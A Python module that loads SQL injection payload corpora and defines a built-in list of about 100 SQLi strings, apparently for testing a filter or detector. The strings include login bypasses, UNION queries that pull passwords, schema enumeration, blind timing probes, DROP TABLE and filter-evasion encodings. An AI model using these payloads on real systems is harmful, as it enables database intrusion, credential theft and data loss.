"""Load and normalize raw SQLi payload corpora."""
from __future__ import annotations

from pathlib import Path


def normalize_payload(line: str) -> str:
    s = line.strip()
    if not s or s.startswith("#"):
        return ""
    return s

def load_payloads_from_file(path: Path) -> list[str]:
    out = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        p = normalize_payload(line)
        if p:
            out.append(p)
    return out

def load_payloads_from_dir(root: Path) -> list[str]:
    root = Path(root)
    seen = set()
    out = []
    for f in sorted(root.rglob("*.txt")) if root.is_dir() else []:
        for p in load_payloads_from_file(f):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out

BUILTIN_PAYLOADS = [
    # String literal escapes/breakouts
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "admin'--",
    "admin'#",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT username,password,3 FROM users --",
    "' UNION ALL SELECT NULL,NULL,database() --",
    "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --",
    "' AND SLEEP(5) --",
    "' AND BENCHMARK(5000000,MD5(1)) --",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    # Numeric
    "1 OR 1=1",
    "1 OR 1=1 --",
    "1 UNION SELECT NULL,NULL,NULL --",
    "1 UNION SELECT 1,2,3 --",
    "1; DROP TABLE users --",
    "1; SELECT * FROM users --",
    # Error-based
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1) --",
    # Boolean blind
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND SUBSTRING(database(),1,1)='s' --",
    # ORDER BY
    "1,(SELECT IF(1=1,1,(SELECT table_name FROM information_schema.tables)))",
    "(CASE WHEN 1=1 THEN 1 ELSE 1/0 END)",
    # Comment variants
    "'/**/OR/**/1=1--",
    "'/*!UNION*//!/SELECT*//!/1,2,3--",
    # Hex encoding
    "0x27204f5220313d31202d2d",
    # Double query
    "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    # NoSQL-adjacent
    "' || '1'='1",
    # SQLite-specific
    "' UNION SELECT sql,name,NULL FROM sqlite_master --",
    "' UNION SELECT sqlite_version(),NULL,NULL --",
    # Stacked
    "'; ATTACH DATABASE 'test.db' AS test; --",
    # Case variation
    "' UnIoN SeLeCt 1,2,3 --",
    # Whitespace bypass
    "'%09OR%091=1--",
    # Newline bypass
    "'\nOR\n1=1--",
    # Double encoding
    "%27%20OR%201=1--",
    # Null byte
    "%00' OR 1=1 --",
    # Additional payloads for volume
    "' OR ''='",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "1 OR 1=1 --",
    "1 OR 1=1 #",
    "1 UNION SELECT NULL --",
    "1 UNION SELECT 1 --",
    "1 UNION SELECT 1,2 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT 1,2 --",
    "' UNION SELECT name,password FROM users --",
    "' AND 1=1 #",
    "' AND 1=2 #",
    "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --",
    "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
    "' UNION SELECT GROUP_CONCAT(username,0x3a,password) FROM users --",
    "1 UNION SELECT GROUP_CONCAT(name) FROM users --",
    "' OR 1=1/*",
    "1 OR 1=1/*",
    "' /*!50000UNION*/ SELECT 1,2,3 --",
    "' UNION SELECT @@version,NULL,NULL --",
    "' UNION SELECT user(),NULL,NULL --",
    "' UNION SELECT current_user,NULL,NULL --",
    # Additional v2 payloads for more diversity
    "' OR 1=1 LIMIT 1 --",
    "' OR 1=1 LIMIT 0,1 --",
    "1 OR 1=1 LIMIT 1",
    "' XOR 1=1 --",
    "1 XOR 1=1",
    "' UNION SELECT 1,version(),3 --",
    "' UNION ALL SELECT 1,database(),3 --",
    "1 UNION SELECT 1,2,database() --",
    "' UNION SELECT NULL,NULL,sqlite_version() --",
    "' UNION SELECT 1,2,table_name FROM sqlite_master WHERE type='table' --",
    "' UNION SELECT 1,2,sql FROM sqlite_master WHERE type='table' --",
    "' UNION SELECT 1,2,name FROM sqlite_master --",
    "' OR EXISTS(SELECT 1 FROM users) --",
    "' OR (SELECT count(*) FROM users)>0 --",
    "1 OR (SELECT 1)",
    "' AND 1=CONVERT(int,@@version) --",
    "' AND 1=CAST(@@version AS int) --",
    "' UNION SELECT 1,2,GROUP_CONCAT(name) FROM users --",
    "1 UNION SELECT 1,2,GROUP_CONCAT(name) FROM users --",
    "admin",
    "password",
    "root",
    "sa",
    "' OR name LIKE '%admin%' --",
    "' UNION SELECT 1,password,3 FROM users WHERE name='admin' --",
    "1 UNION SELECT 1,password,3 FROM users WHERE name='admin' --",
    "' UNION SELECT 1,login,3 FROM users --",
    # Comment-free payloads (bypass comment blocking)
    "' OR '1'='1",
    "' OR 1=1",
    "1 OR 1=1",
    "' OR ''='",
    "' OR 'a'='a",
    "' UNION SELECT 1,2,3",
    "1 UNION SELECT 1,2,3",
    "' OR 1=1 LIMIT 1",
    "1 OR 1=1 LIMIT 1",
    # CASE/WHEN without AND/OR
    "1,(CASE WHEN 1=1 THEN 1 ELSE 0 END)",
    "' OR 1=(SELECT 1)",
    # Plain valid strings (always pass)
    "hello",
    "123",
    "test_input",
]

def load_all_corpora(raw_dir: Path) -> list[str]:
    raw_dir = Path(raw_dir)
    seen = set()
    out = []
    for subdir in ("SecLists", "PayloadsAllTheThings"):
        d = raw_dir / subdir
        if d.is_dir():
            for p in load_payloads_from_dir(d):
                if p not in seen:
                    seen.add(p)
                    out.append(p)
    for p in BUILTIN_PAYLOADS:
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out
